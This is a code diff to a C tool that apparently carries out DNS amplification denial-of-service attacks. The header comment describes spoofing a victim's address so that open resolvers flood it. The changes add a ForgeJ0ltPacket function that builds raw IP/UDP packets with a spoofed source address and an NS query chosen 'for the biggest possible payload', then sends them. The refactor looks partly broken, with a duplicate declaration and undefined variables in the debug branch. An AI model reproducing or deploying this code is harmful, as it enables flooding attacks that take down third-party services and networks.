@@ -27,7 +27,7 @@
  * accessible open DNS servers to flood a target with DNS
  * response traffic. An attacker sends a DNS lookup request
  * to an open DNS server with the source address spoofed to
- * be the target’s address. When the DNS server sends the S 
+ * be the target’s address. When the DNS server sends the
  * record response, it is sent to the target instead.
  * ------------------------------------------------------------
  * > Big hi to the only sane place left on the internet:
@@ -244,16 +244,15 @@ PackDNSHeader(DNSHEADER* dnshdr
 void
 PackUDPHeader(UDPHEADER* udphdr,
         PSEUDOHDR* pseudohdr,
-        const char* resolverport,
-        const char* spoofport,
+        uint16_t spoofport,
         size_t nwritten
 );
 
 void
 PackIPHeader(IPHEADER* iphdr,
         PSEUDOHDR* pseudohdr,
-        const char* resolvip,
-        const char* spoofip,
+        uint32_t resolvip,
+        uint32_t spoofip,
         size_t nwritten,
         size_t udpsz
 );
@@ -282,16 +281,71 @@ PrintHex(const uint8_t* datagram,
         size_t nwritten
 );
 
-void
-InsertDNSAdditional(uint8_t** buf,
-        size_t* buflen
+size_t
+ForgeJ0ltPacket(char* payload,
+        uint32_t resolvip,
+        uint32_t spoofip,
+        uint16_t spoofport
 );
 
 #define DEBUG 0
 int
 main(int argc, char** argv)
 {
-    const char* resolvip, * spoofip, * resolvport, * spoofport, * url;
+    const char* resolvip;
+    char payload[ NS_PACKETSZ ];
+    size_t szpayload;
+    uint32_t spoofip, resolvip;
+    uint16_t spoofport;
+
+    if (argc != 3) {
+        printf("%s", g_ansi);
+        goto fail_state;
+    }
+
+    spoofip = inet_addr(argv[ 1 ]); // spoofed ip address to victim
+    if (spoofip == 0) {
+        fprintf(stderr, "Invalid address\n");
+        exit(EXIT_FAILURE);
+    }
+    spoofip = htonl(spoofip);
+
+    errno = 0;
+    spoofport = ( uint16_t ) strtol(argv[ 2 ], NULL, 0); // port to victim
+    if (errno != 0) {
+        perror("Invalid port\n");
+        exit(EXIT_FAILURE);
+    }
+
+//TODO: Add fopen() / fread() loop for resolver list
+    resolvip = inet_addr("");
+    if (resolvip != 0) {
+        resolvip = htonl(resolvip);
+    }
+
+    szpayload = ForgeJ0ltPacket(payload, resolvip, spoofip, spoofport);
+#if !DEBUG
+    if (SendPayload(payload, resolvip, NS_DEFAULTPORT, szpayload) == false)
+        goto fail_state;
+#else 
+    PrintHex(datagram, nwritten);
+#endif
+
+    return 0;
+fail_state:
+    perror("error");
+    exit(EXIT_FAILURE);
+} // END MAIN
+
+
+size_t
+ForgeJ0ltPacket(char* payload,
+        uint32_t resolvip,
+        uint32_t spoofip,
+        uint16_t spoofport) {
+
+    const char* url = ".";  // . is for the biggest possible payload 
+                            // Note: can be swapped for a list of urls
     uint8_t pktbuf[ NS_PACKETSZ ], datagram[ NS_PACKETSZ ];
     uint8_t* curpos;
     size_t buflen, nwritten, szdatagram;
@@ -301,17 +355,6 @@ main(int argc, char** argv)
     DNSHEADER dnsheader;
     IPHEADER ipheader;
     PSEUDOHDR pseudoheader;
-
-    if (argc != 3) {
-        printf("%s", g_ansi);
-        goto fail_state;
-    }
-
-    resolvip = argv[ 1 ];
-    spoofip = argv[ 2 ];
-    resolvport = argv[ 3 ];
-    spoofport = argv[ 4 ];
-    url = argv[ 5 ];
 
     buflen = NS_PACKETSZ;
     memset(pktbuf, 0, NS_PACKETSZ);
@@ -323,40 +366,26 @@ main(int argc, char** argv)
     status &= InsertDNSQuestion(( void** ) &curpos, &buflen, url, ns_t_ns, ns_c_in);
 
     if (status == false)
-        goto fail_state;
+        return 0;
 
     nwritten = NS_PACKETSZ - buflen;
     PackIPHeader(&ipheader, &pseudoheader, resolvip, spoofip, nwritten, sizeof(UDPHEADER));
-    PackUDPHeader(&udpheader, &pseudoheader, resolvport, spoofport, nwritten);
+    PackUDPHeader(&udpheader, &pseudoheader, spoofport, nwritten);
 
     memset(datagram, 0, NS_PACKETSZ);
     curpos = datagram;
     status &= InsertIPHeader(&curpos, &buflen, &ipheader);
     status &= InsertUDPHeader(&curpos, &buflen, &udpheader, &pseudoheader, pktbuf);
     if (status == false)
-        goto fail_state;
+        return 0;
 
     szdatagram = buflen;
     InsertData(( void** ) &curpos, &szdatagram, pktbuf, nwritten);
     nwritten = NS_PACKETSZ - buflen;
 
-#if !DEBUG
-    if (SendPayload(
-        datagram,
-        ipheader.daddr,
-        udpheader.uh_dport,
-        nwritten
-    ) == false)
-        goto fail_state;
-#else 
-    PrintHex(datagram, nwritten);
-#endif
-    return 0;
-fail_state:
-    perror("error");
-    exit(EXIT_FAILURE);
-} // END MAIN
-
+    memcpy(payload, datagram, nwritten);
+    return nwritten;
+}
 
 void
 PrintHex(const uint8_t* datagram,
@@ -412,8 +441,8 @@ SendPayload(const uint8_t* datagram,
 void
 PackIPHeader(IPHEADER* iphdr,
         PSEUDOHDR* pseudohdr,
-        const char* resolvip,
-        const char* spoofip,
+        uint32_t resolvip,
+        uint32_t spoofip,
         size_t nwritten,
         size_t udpsz) {
 
@@ -425,9 +454,8 @@ PackIPHeader(IPHEADER* iphdr,
     iphdr->frag_off = IP_OF_J0LT;
     iphdr->ttl = IP_TTL_J0LT;
     iphdr->protocol = getprotobyname("udp")->p_proto;
-    iphdr->saddr = htonl(inet_addr(spoofip)); // spoofed ip address to victim
-    iphdr->daddr = htonl(inet_addr(resolvip)); // name server 
-
+    iphdr->saddr = spoofip; // spoofed ip address to victim
+    iphdr->daddr = resolvip; // open resvoler 
     memset(pseudohdr, 0, sizeof(PSEUDOHDR));
     pseudohdr->protocol = iphdr->protocol;
     pseudohdr->destaddr = iphdr->daddr;
@@ -438,24 +466,12 @@ PackIPHeader(IPHEADER* iphdr,
 void
 PackUDPHeader(UDPHEADER* udphdr,
         PSEUDOHDR* pseudohdr,
-        const char* resolverport,
-        const char* spoofport,
+        uint16_t spoofport,
         size_t nwritten) {
 
-    uint16_t dport_uint16;
-    uint16_t sport_uint16;
-
-    errno = 0;
-    dport_uint16 = ( uint16_t ) strtol(resolverport, NULL, 0);
-    sport_uint16 = ( uint16_t ) strtol(spoofport, NULL, 0);
-    if (errno != 0) {
-        perror("port error: strtol");
-        exit(EXIT_FAILURE);
-    }
-
     memset(udphdr, 0, sizeof(UDPHEADER));
-    udphdr->uh_dport = dport_uint16; // nameserver port
-    udphdr->uh_sport = sport_uint16; // victim port
+    udphdr->uh_dport = NS_DEFAULTPORT; // nameserver port
+    udphdr->uh_sport = spoofport;    // victim port
     udphdr->uh_ulen = nwritten + sizeof(UDPHEADER);
 
     pseudohdr->udplen = sizeof(UDPHEADER);
